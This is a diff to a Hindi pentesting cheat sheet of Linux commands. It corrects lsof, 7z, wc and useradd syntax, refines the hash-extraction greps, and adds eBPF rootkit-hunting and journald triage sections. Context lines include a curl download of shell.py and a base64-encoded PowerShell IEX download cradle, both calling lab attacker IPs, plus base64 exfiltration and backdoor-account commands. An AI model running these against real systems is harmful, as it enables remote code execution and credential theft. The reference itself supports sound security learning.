@@ -3,6 +3,9 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 ## सामान्य Bash
+
+`lsof -i4` और `lsof -i6` IP family चुनते हैं।<sup>[[8]](#references)</sup> `7z x` archive को उसकी directory layout बनाए रखते हुए extract करता है।<sup>[[9]](#references)</sup> `wc -c` characters नहीं, bytes गिनता है।<sup>[[13]](#references)</sup> Account के उदाहरण में `passwd` को interactively इस्तेमाल किया गया है: `useradd -p` पहले से गणना किए गए crypt hash की अपेक्षा करता है, shell command की नहीं, और इसका argument process listings में दिखाई देता है।<sup>[[10]](#references)</sup>
+
 ```bash
 #Exfiltration using Base64
 base64 -w 0 file
@@ -18,7 +21,7 @@ echo -n -e
 
 #Count
 wc -l <file> #Lines
-wc -c #Chars
+wc -c #Bytes
 
 #Sort
 sort -nr #Sort by number and then reverse
@@ -36,9 +39,9 @@ curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 lsof #Open files belonging to any process
 lsof -p 3 #Open files used by the process
 lsof -i #Files used by networks processes
-lsof -i 4 #Files used by network IPv4 processes
-lsof -i 6 #Files used by network IPv6 processes
-lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
+lsof -i4 #Files used by network IPv4 processes
+lsof -i6 #Files used by network IPv6 processes
+lsof -i4 -a -p 1234 #List all open IPv4 network files in use by process 1234
 lsof +D /lib #Processes using files inside the indicated dir
 lsof -i :80 #Files uses by networks processes
 fuser -nv tcp 80
@@ -58,11 +61,12 @@ bzip2 -d /path/to/yourfile.bz2
 tar jxf file.tar.bz2
 gunzip /path/to/yourfile.gz
 unzip file.zip
-7z -x file.7z
+7z x file.7z
 sudo apt-get install xz-utils; unxz file.xz
 
 #Add new user
-useradd -p 'openssl passwd -1 <Password>' hacker
+sudo useradd -m hacker
+sudo passwd hacker
 
 #Clipboard
 xclip -sel c < cat file.txt
@@ -129,7 +133,9 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
+
 ## Windows के लिए Bash
+
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
@@ -149,7 +155,11 @@ python pyinstaller.py --onefile exploit.py
 #sudo apt-get install gcc-mingw-w64-i686
 i686-mingw32msvc-gcc -o executable useradd.c
 ```
+
 ## Greps
+
+`grep -E` का उपयोग `{n}` क्वांटिफ़ायर जैसे एक्सटेंडेड रेगुलर एक्सप्रेशन के लिए और MD5 look-arounds के लिए `grep -P` का उपयोग करें। पासवर्ड हैश निकालते समय shell dollar signs को quotes में रखें।<sup>[[11]](#references)</sup> ये expressions **संभावित परिणाम** ढूँढ़ते हैं, किसी hash type का प्रमाण नहीं; cracking mode चुनने से पहले परिणाम की तुलना [hash identification and cracking workflow](../../crypto/hashes/#password-hashing-and-cracking) से करें।<sup>[[12]](#references)</sup>
+
 ```bash
 #Extract emails from file
 grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt
@@ -163,29 +173,23 @@ grep -i "pwd\|passw" file.txt
 #Extract users
 grep -i "user\|invalid\|authentication\|login" file.txt
 
-# Extract hashes
-#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
-egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
-#Extract valid MySQL-Old hashes
-grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
-#Extract blowfish hashes
-grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
-#Extract Joomla hashes
-egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
-#Extract VBulletin hashes
-egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
-#Extraxt phpBB3-MD5
-egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
-#Extract Wordpress-MD5
-egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
-#Extract Drupal 7
-egrep -o '$S$S{52}' *.txt > drupal-7.txt
-#Extract old Unix-md5
-egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
-#Extract md5-apr1
-egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
-#Extract sha512crypt, SHA512(Unix)
-egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt
+# Extract hash candidates from text (validate against the application format)
+# Raw MD5: 32 hex characters
+grep -Po '(?<![[:xdigit:]])[[:xdigit:]]{32}(?![[:xdigit:]])' *.txt > md5-hashes.txt
+# Legacy MySQL323: two 8-hex halves whose leading nibble is 0..7
+grep -Eo '[0-7][[:xdigit:]]{7}[0-7][[:xdigit:]]{7}' *.txt > mysql-old-hashes.txt
+# bcrypt ($2a$/$2b$/$2y$): 60 characters total
+grep -Eo '\$2[aby]\$[0-9]{2}\$[./A-Za-z0-9]{53}' *.txt > bcrypt-hashes.txt
+# Legacy MD5:salt pairs: identify the application before choosing a mode
+grep -Eo '[[:xdigit:]]{32}:[[:alnum:]]{3,32}' *.txt > md5-salt-candidates.txt
+# phpass ($H$ phpBB3; $P$ WordPress and other applications)
+grep -Eo '\$[PH]\$[./A-Za-z0-9]{31}' *.txt > phpass-hashes.txt
+# Drupal 7
+grep -Eo '\$S\$[./A-Za-z0-9]{52}' *.txt > drupal-7.txt
+# Unix md5crypt, Apache apr1, and sha512crypt (optional rounds field)
+grep -Eo '\$1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}' *.txt > md5crypt.txt
+grep -Eo '\$apr1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}' *.txt > apr1.txt
+grep -Eo '\$6\$(rounds=[0-9]+\$)?[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{86}' *.txt > sha512crypt.txt
 
 #Extract e-mails from text files
 grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt
@@ -229,7 +233,9 @@ grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
 #Extract ISBN Numbers
 egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
 ```
-## Find
+
+## खोजें
+
 ```bash
 # Find SUID set files.
 find / -perm /u=s -ls 2>/dev/null
@@ -258,19 +264,25 @@ find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /p
 # Found Newer directory only and sort by time. (depth = 5)
 find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
 ```
-## Nmap सहायता खोजें
+
+## Nmap खोज सहायता
+
 ```bash
 #Nmap scripts ((default or version) and smb))
 nmap --script-help "(default or version) and *smb*"
 locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
 nmap --script-help "(default or version) and smb)"
 ```
+
 ## Bash
+
 ```bash
 #All bytes inside a file (except 0x20 and 0x00)
 for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
 ```
+
 ## Iptables
+
 ```bash
 #Delete curent rules and chains
 iptables --flush
@@ -301,9 +313,11 @@ iptables -P INPUT DROP
 iptables -P FORWARD ACCEPT
 iptables -P OUTPUT ACCEPT
 ```
-## eBPF Telemetry & Rootkit Hunting
 
-Rootkit research ने TripleCross जैसे eBPF-based implants और BPFDoor variants जैसे BPF-based backdoors का प्रदर्शन किया है। अप्रत्याशित BPF programs, attachments या maps को compromise का प्रमाण मानने के बजाय investigation leads मानें।<sup>[[3]](#references)[[4]](#references)</sup> `bpftool` या `eBPFmon` से authorized systems का baseline तैयार करें: `bpftool` programs और maps की enumeration कर सकता है, program instructions को dump कर सकता है और supported features की query कर सकता है, जबकि eBPFmon यह जानकारी TUI में दिखाता है।<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>
+## eBPF Telemetry और Rootkit Hunting
+
+Rootkit research में TripleCross जैसे eBPF-आधारित implants और BPFDoor variants जैसे BPF-आधारित backdoors, दोनों का प्रदर्शन किया गया है। अनपेक्षित BPF programs, attachments या maps को compromise का प्रमाण मानने के बजाय जांच के सुराग मानें।<sup>[[3]](#references)[[4]](#references)</sup> अधिकृत systems का baseline `bpftool` या `eBPFmon` से तैयार करें: `bpftool` programs और maps की सूची बना सकता है, program instructions dump कर सकता है और समर्थित features के बारे में जानकारी ले सकता है, जबकि eBPFmon यह जानकारी TUI में दिखाता है।<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>
+
 ```bash
 #Enumerate all eBPF programs, attach points, owning PIDs and map IDs
 sudo bpftool prog
@@ -321,11 +335,13 @@ sudo bpftool feature probe | less
 #TUI wrapper that tracks program/map diffs in real time (wraps bpftool perf/net output)
 sudo ebpfmon
 ```
-`bpftool` के output को अपेक्षित NIC/cgroup attachments के साथ correlate करें; किसी unapproved PID के स्वामित्व वाला अचानक दिखाई देने वाला `xdp` या `kprobe` program investigation lead है, injected payload का निर्णायक प्रमाण नहीं।<sup>[[5]](#references)[[6]](#references)</sup>
 
-## Journald Incident Triage
+`bpftool` के आउटपुट का अपेक्षित NIC/cgroup attachments से मिलान करें; किसी अनधिकृत PID के स्वामित्व वाला अचानक दिखा `xdp` या `kprobe` प्रोग्राम जाँच का सुराग है, injected payload का निर्णायक प्रमाण नहीं।<sup>[[5]](#references)[[6]](#references)</sup>
 
-`journalctl`, `systemd-journald` से structured entries पढ़ता है और boot, priority, unit, UID तथा relative time के आधार पर filtering का support करता है। Evidence को सुरक्षित रखने या उसकी तुलना करने की आवश्यकता होने पर इन filters को JSON output के साथ combine करें; केवल filtering से यह सिद्ध नहीं होता कि logs के साथ tampering नहीं की गई है।<sup>[[2]](#references)[[7]](#references)</sup>
+## Journald घटना की प्रारंभिक जाँच
+
+`journalctl`, `systemd-journald` से structured entries पढ़ता है और boot, priority, unit, UID तथा सापेक्ष समय के आधार पर फ़िल्टर करने की सुविधा देता है। जब आपको साक्ष्य सुरक्षित रखने या उनकी तुलना करने की आवश्यकता हो, तो इन फ़िल्टरों के साथ JSON output का उपयोग करें; केवल फ़िल्टर करने से यह साबित नहीं होता कि logs के साथ छेड़छाड़ नहीं की गई है।<sup>[[2]](#references)[[7]](#references)</sup>
+
 ```bash
 journalctl --list-boots                                #Enumerate boot IDs with timestamps
 journalctl -b -1 -p err -o short-iso                   #Previous boot only, severity >= err
@@ -336,15 +352,24 @@ journalctl --disk-usage                               #Quickly show journal size
 sudo journalctl --vacuum-size=1G --vacuum-time=7days   #Trim only after taking evidence
 journalctl --no-pager --since="2025-06-01" --until="2025-06-10" > system_logs_2025-06-01_to_06-10.log
 ```
-`--grep 'Invalid user' --case-sensitive` या `-k` (केवल kernel messages) तब जोड़ें जब आपको अधिक सटीक filters की आवश्यकता हो, और याद रखें कि `_PID`, `_SYSTEMD_UNIT`, `_HOSTNAME`, और `_TRANSPORT` selectors को targeted hunts के लिए संयोजित किया जा सकता है।<sup>[[7]](#references)</sup>
+
+`--grep 'Invalid user' --case-sensitive` या `-k` (केवल kernel संदेश) जोड़ें, जब आपको अधिक सटीक फ़िल्टर चाहिए हों। लक्षित खोज के लिए `_PID`, `_SYSTEMD_UNIT`, `_HOSTNAME` और `_TRANSPORT` selectors को मिलाकर इस्तेमाल किया जा सकता है।<sup>[[7]](#references)</sup>
+
+
 
 ## References
 
-- [1] [eBPFmon: eBPF applications को explore और interact करने के लिए एक नया tool](https://redcanary.com/blog/linux-security/ebpfmon/)
-- [2] [Linux logs देखने के लिए journalctl command का उपयोग कैसे करें](https://www.hostinger.com/tutorials/journalctl-command)
+- [1] [eBPFmon: eBPF एप्लिकेशन की खोज और उनसे इंटरैक्ट करने का नया टूल](https://redcanary.com/blog/linux-security/ebpfmon/)
+- [2] [Linux लॉग देखने के लिए journalctl कमांड का उपयोग कैसे करें](https://www.hostinger.com/tutorials/journalctl-command)
 - [3] [h3xduck/TripleCross](https://github.com/h3xduck/TripleCross)
-- [4] [Rapid7 Labs: Telecom Networks में BPFdoor](https://www.rapid7.com/blog/post/tr-bpfdoor-telecom-networks-sleeper-cells-threat-research-report/)
-- [5] [BPF Documentation — Linux Kernel documentation](https://docs.kernel.org/bpf/)
+- [4] [Rapid7 Labs: टेलीकॉम नेटवर्क में BPFdoor](https://www.rapid7.com/blog/post/tr-bpfdoor-telecom-networks-sleeper-cells-threat-research-report/)
+- [5] [BPF दस्तावेज़ीकरण — Linux Kernel का दस्तावेज़ीकरण](https://docs.kernel.org/bpf/)
 - [6] [libbpf/bpftool](https://github.com/libbpf/bpftool)
-- [7] [journalctl(1) — Linux manual page](https://man7.org/linux/man-pages/man1/journalctl.1.html)
+- [7] [journalctl(1) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man1/journalctl.1.html)
+- [8] [lsof(8) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man8/lsof.8.html)
+- [9] [7-Zip x कमांड](https://documentation.help/7-Zip-18.0/extract_full.htm)
+- [10] [useradd(8) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man8/useradd.8.html)
+- [11] [grep(1) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man1/grep.1.html)
+- [12] [Hashcat के उदाहरण हैश](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-example-hashes.md)
+- [13] [wc(1) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man1/wc.1.html)
 {{#include ../../banners/hacktricks-training.md}}
